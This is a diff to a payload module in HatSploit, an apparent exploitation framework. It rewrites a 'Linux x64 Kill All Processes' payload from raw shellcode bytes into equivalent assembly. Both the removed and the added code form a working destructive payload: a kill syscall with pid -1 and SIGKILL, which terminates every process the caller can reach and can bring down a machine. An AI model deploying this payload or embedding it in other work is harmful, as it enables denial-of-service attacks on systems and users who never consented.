@@ -6,9 +6,10 @@
 #
 
 from hatsploit.lib.payload import Payload
+from hatsploit.utils.payload import PayloadTools
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, PayloadTools):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Kill All Processes",
@@ -24,6 +25,16 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        return (
-            b"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
+        return self.assemble(
+            self.details['Architecture'],
+            """
+            start:
+                push 0x3e
+                pop rax
+                push -1
+                pop rdi
+                push 0x9
+                pop rsi
+                syscall
+            """
         )
